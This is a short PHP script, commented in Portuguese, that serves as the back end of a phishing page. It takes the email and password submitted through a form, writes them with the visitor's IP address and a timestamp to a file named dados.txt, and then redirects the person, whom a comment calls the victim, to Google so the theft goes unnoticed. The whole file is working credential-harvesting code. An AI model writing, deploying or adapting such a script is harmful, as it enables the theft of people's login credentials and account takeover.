<?php
$email = $_POST['email'] ?? '';
$senha = $_POST['senha'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$data = date('Y-m-d H:i:s');

// Formata os dados capturados
$registro = "[$data] IP: $ip | Email: $email | Senha: $senha\n";

// Salva no arquivo 'dados.txt'
file_put_contents("dados.txt", $registro, FILE_APPEND);

// Redireciona a vítima
header("Location: https://google.com");
exit;
?>
